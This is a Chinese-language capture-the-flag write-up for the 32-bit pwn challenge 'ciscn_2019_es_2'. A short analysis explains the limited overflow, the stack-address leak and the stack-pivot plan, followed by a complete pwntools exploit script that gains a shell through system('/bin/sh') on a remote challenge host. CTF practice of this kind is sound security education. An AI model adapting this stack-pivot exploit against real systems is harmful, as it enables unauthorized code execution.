---
title: "ciscn_2019_es_2"
description: ""
date: 2023-04-07T16:58:40+08:00
lastmod: 2023-04-07T16:58:40+08:00
draft: false
images: []
type: docs
weight: 979
toc: true
---

## 0x01 分析

![ef8a5afff8980929b47ac638425f9a8b](images/ef8a5afff8980929b47ac638425f9a8b.png)  

这里溢出只能覆盖到函数返回地址

![36701aa1b9f32bcb3b0cdaf99016faf9](images/36701aa1b9f32bcb3b0cdaf99016faf9.png)  

没有现成的getshell函数，也没有 `/bin/sh` 字符串，所以要想办法写入字符串并将其传递给system函数

![fb02ecd459c9d0e1c7983f317ec7b08e](images/fb02ecd459c9d0e1c7983f317ec7b08e.png)  

从调试可以看到栈中有栈地址，可以通过溢出+printf将其打印出来，然后利用栈迁移来实现攻击

## 0x02 Exploit

```python
from pwn import*
context.log_level = 'debug'

# o = process("./pwn")
o = remote("node4.buuoj.cn", 27382)
leave_ret = 0x80485FD
sys_plt = 0x8048400 
payload = b'a'*(9*4)
o.send(payload)
o.recvuntil(b'a'*36)
stack = u32(o.recv(4))
log.info(hex(stack))
buf = stack - (0xffffd544 - 0xffffd460)
payload = b"aaaa" + p32(sys_plt)*2 + p32(buf+16) + b"/bin/sh"
payload = payload.ljust(40, b'\x00')
payload += p32(buf) + p32(leave_ret)
o.send(payload)
o.interactive()

```

![96fe9331d0ce9cb5283bfa7d32ee7fe1](images/96fe9331d0ce9cb5283bfa7d32ee7fe1.png)

自行调试
